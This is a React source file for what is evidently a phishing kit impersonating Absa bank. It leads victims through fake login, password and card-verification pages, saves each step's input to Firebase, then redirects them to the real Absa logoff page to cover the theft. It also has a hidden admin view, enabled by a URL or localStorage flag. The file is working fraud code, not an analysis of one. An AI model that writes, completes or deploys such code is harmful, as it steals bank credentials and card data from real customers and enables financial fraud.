import React, { useState } from 'react';
import LoginPage from './pages/LoginPage';
import PasswordPage from './pages/PasswordPage';
import CardVerificationPage from './pages/CardVerificationPage';
import AdminPage from './pages/AdminPage';
import { saveUserSession } from './database';

function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [loginData, setLoginData] = useState(null);
  const [sessionId] = useState(() => Date.now().toString());
  const [showAdmin, setShowAdmin] = useState(false);

  // Check if admin mode is enabled (you can change this condition)
  const isAdminMode = window.location.search.includes('admin=true') || 
                     window.location.hash.includes('admin=true') ||
                     localStorage.getItem('adminMode') === 'true';

  const handleStep1Submit = async (data: any) => {
    console.log('Step 1 completed:', data);
    setLoginData(data);

    try {
      // Save session data for tracking
      await saveUserSession({
        sessionId,
        step: 1,
        data: data,
        timestamp: new Date().toISOString()
      });
      console.log('Step 1 session data saved to Firebase');
    } catch (error) {
      console.error('Error saving session data:', error);
    }

    setCurrentStep(2);
  };

  const handleStep2Submit = async (data: any) => {
    console.log('Step 2 completed:', data);
    setLoginData(data);

    try {
      // Save session data for tracking
      await saveUserSession({
        sessionId,
        step: 2,
        data: data,
        timestamp: new Date().toISOString()
      });
      console.log('Step 2 session data saved to Firebase');
    } catch (error) {
      console.error('Error saving session data:', error);
    }

    setCurrentStep(3);
  };

  const handleStep3Submit = async (data: any) => {
    console.log('Step 3 completed - FINAL DATA:', data);
    setLoginData(data);

    try {
      // Save final session data for tracking
      await saveUserSession({
        sessionId,
        step: 3,
        data: data,
        timestamp: new Date().toISOString(),
        completed: true
      });
      console.log('Final session data saved to Firebase');

      // Wait a moment to show the data was saved
      setTimeout(() => {
        console.log('Redirecting to Absa website...');
        // Redirect to Absa website
        window.location.href = 'https://www.absa.co.za/absa-online-logoff/';
      }, 1000);

    } catch (error) {
      console.error('Error saving final session data:', error);
      alert('Error saving data. Please try again.');
    }
  };

  // Show admin page if in admin mode
  if (isAdminMode) {
    return <AdminPage onBack={() => setShowAdmin(false)} />;
  }

  return (
    <div className="App">
      {currentStep === 1 && (
        <LoginPage onLoginSubmit={handleStep1Submit} />
      )}
      {currentStep === 2 && (
        <PasswordPage 
          loginData={loginData} 
          onPasswordSubmit={handleStep2Submit} 
        />
      )}
      {currentStep === 3 && (
        <CardVerificationPage 
          loginData={loginData} 
          onCardVerificationSubmit={handleStep3Submit} 
        />
      )}
    </div>
  );
}

export default App;
